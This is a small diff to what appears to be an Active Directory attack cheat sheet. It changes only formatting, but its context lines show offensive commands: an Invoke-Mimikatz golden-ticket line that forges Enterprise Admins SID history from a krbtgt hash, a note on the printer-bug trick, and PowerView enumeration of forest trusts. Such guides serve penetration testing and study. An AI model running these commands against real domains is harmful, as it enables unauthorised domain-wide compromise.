@@ -979,6 +979,8 @@ krbtgt -
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:child.parent.lab /sid:S-1-5-21-<currentdomainSID> /sids:S-1-5-21-<parentdomainSID>-519 /krbtgt:f052addf1d43f864a7d0c21cbce440c9 /ticket:C:\Temp\krbtgt_tkt.kirbi"'
 ```
 
+* * *
+
 #### Unconstrained Printer Forestry
 You can also use exactly the same printer bug trick as before, but making the machine account of the Forest ROOT domain controller to connect to the previously compromised Web Server in the child domain.
 
@@ -1000,7 +1002,9 @@ This gives us the NTLM hash of the Root Domain Administrator account and access 
 #### Across Forests - Inter-Forest Trust
 
 ```Get-DomainTrustMapping```
+
 ```Get-DomainUser -Domain externalnet.com```
+
 ```Get-DomainForeignGroupMember -Domain externalnet.com```
 
 There is SID filtering across forests so abusing SID history to force ```/-519``` for Enterprise Admins will not work when abusing external forest trusts. Other than that it is the same:
